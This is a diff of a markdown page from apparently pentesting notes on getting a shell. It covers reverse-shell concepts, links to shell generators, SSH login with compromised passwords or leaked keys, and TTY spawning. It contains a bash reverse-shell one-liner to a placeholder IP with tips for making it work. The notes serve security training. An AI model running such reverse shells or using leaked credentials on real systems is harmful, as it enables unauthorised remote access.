@@ -2,14 +2,20 @@
 sort : 3
 ---
 
-# Spawning a Shell
+# Get a Shell
 
-## Reverse Shell 
+## Reverse Shells    
 
-[the best place to generate a reverse shell](https://www.revshells.com/)
+A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system's vulnerabilities to initiate a shell session and then access the victim's computer.
+
+Mostly this is done by uploading the reverse shell as a file, or abusing an RCE vulnerability to execute it directly.
+
+[generate a reverse shell](https://www.revshells.com/)
+
+[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 ```note
-some times the shell doesn't work, why ?? 
+some times thereverse shell doesn't work, why ?? 
 
 * if it is a bash reverse shell, e.g. bash -i >& /dev/tcp/10.10.x.x/1234 0>&1 , try precede it with `bash -c` 
 
@@ -30,13 +36,18 @@ some times the shell doesn't work, why ??
 
 ## SSH 
 
-### Password Reuse Misconfiguration OR Private Key Leakage : 
+SSH or Secure Shell or Secure Socket Shell,  is a network protocol that gives users a secure way to access a computer over an unsecured network.
+
+### Using Compromised Password OR Reuse Misconfiguration OR Private Key Leakage : 
 
 ```bash
-$ ssh Username@Host
+$ ssh victim@Host
     password : ******* 
 
-$ ssh -i PrivateKey Username@Host
+# OR 
+
+$ chmod 600 PrivateKey
+$ ssh -i PrivateKey victim@Host
 ```
 
 
@@ -86,16 +97,16 @@ why we are doing this ??
 ```
 
 
-### BruteForce Attack
+<!-- ### BruteForce Attack
 
-not recommended ^^ :star:
+not recommended ^^ :star: -->
 
 
 <br><br>
 
 
 
-# Spawn a TTY shell 
+# Spawning a TTY shell 
 
 ```bash
 # Python
